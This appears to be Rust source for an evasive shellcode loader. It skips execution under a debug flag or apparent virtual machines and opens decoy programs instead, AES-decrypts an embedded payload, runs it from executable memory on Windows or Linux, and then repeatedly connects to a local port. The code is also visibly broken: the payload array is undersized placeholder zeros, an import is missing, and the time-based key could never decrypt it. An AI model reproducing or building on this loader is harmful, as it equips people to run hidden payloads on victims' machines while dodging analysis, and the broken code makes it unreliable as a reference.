use std::env;
use std::fs::File;
use std::io::Read;
use std::net::TcpStream;
use std::os::raw::c_void;
use std::ptr;
use std::thread;
use std::time::Duration;
use aes_gcm::aead::{Aead, KeyInit};
use aes_gcm::{Aes256Gcm, Key, Nonce};
#[cfg(target_os = "windows")]
use winapi::um::winnt::PAGE_EXECUTE_READWRITE;
#[cfg(target_os = "windows")]
use winapi::um::memoryapi::VirtualAlloc;
#[cfg(target_os = "windows")]
use winapi::um::processthreadsapi::CreateRemoteThread;
#[cfg(target_os = "windows")]
use winapi::um::handleapi::CloseHandle;
#[cfg(target_os = "windows")]
use winapi::um::winuser::MessageBoxA;
#[cfg(target_os = "linux")]
use libc::{mmap, munmap, MAP_ANON, MAP_PRIVATE, PROT_EXEC, PROT_READ, PROT_WRITE};

fn generate_key() -> [u8; 32] {
    let seed = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs()
        ^ (std::process::id() as u64);
    let mut key = [0u8; 32];
    for i in 0..32 {
        key[i] = ((seed >> (i * 2)) & 0xFF) as u8 ^ 0x5A; 
    }
    key
}
const ENCRYPTED_PAYLOAD: [u8; 256] = [
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

];
fn decrypt_payload(key: &[u8; 32], ciphertext: &[u8]) -> Vec<u8> {
    let cipher = Aes256Gcm::new(Key::from_slice(key));
    let nonce = Nonce::from_slice(b"unique nonce");
    cipher.decrypt(nonce, ciphertext).unwrap_or_else(|_| {
        vec![0xC3]
    })
}
#[cfg(target_os = "windows")]
fn execute_shellcode(shellcode: &[u8]) {
    unsafe {
        let ptr = VirtualAlloc(
            ptr::null_mut(),
            shellcode.len(),
            0x1000, 
            PAGE_EXECUTE_READWRITE,
        );
        if ptr.is_null() {
            return;
        }
        ptr::copy(shellcode.as_ptr(), ptr as *mut u8, shellcode.len());
        let thread_handle = CreateRemoteThread(
            GetCurrentProcess() as *mut _,
            ptr::null_mut(),
            0,
            Some(std::mem::transmute(ptr)),
            ptr::null_mut(),
            0,
            ptr::null_mut(),
        );
        if !thread_handle.is_null() {
            CloseHandle(thread_handle);
        }
    }
}

#[cfg(target_os = "linux")]
fn execute_shellcode(shellcode: &[u8]) {
    unsafe {
        let ptr = mmap(
            ptr::null_mut(),
            shellcode.len(),
            PROT_READ | PROT_WRITE | PROT_EXEC,
            MAP_ANON | MAP_PRIVATE,
            -1,
            0,
        );
        if ptr == libc::MAP_FAILED {
            return;
        }
        ptr::copy(shellcode.as_ptr(), ptr as *mut u8, shellcode.len());
        let func: fn() = std::mem::transmute(ptr);
        func();
        munmap(ptr, shellcode.len());
    }
}
fn main() {
    if env::var("DEBUG").is_ok() {
        return;
    }

    let vm_indicators = ["VMware", "VBox", "QEMU", "Xen"];
    for indicator in vm_indicators.iter() {
        if env::var("PATH").unwrap_or_default().contains(indicator) {
            #[cfg(target_os = "windows")]
            let _ = std::process::Command::new("notepad.exe").spawn();
            #[cfg(target_os = "linux")]
            let _ = std::process::Command::new("echo").arg("Hello World").spawn();
            return;
        }
    }
    let key = generate_key();
    let encrypted = &ENCRYPTED_PAYLOAD[..];
    let shellcode = decrypt_payload(&key, encrypted);
    execute_shellcode(&shellcode);
    loop {
        thread::sleep(Duration::from_secs(3600));
        let _ = TcpStream::connect("127.0.0.1:4444");
    }
}
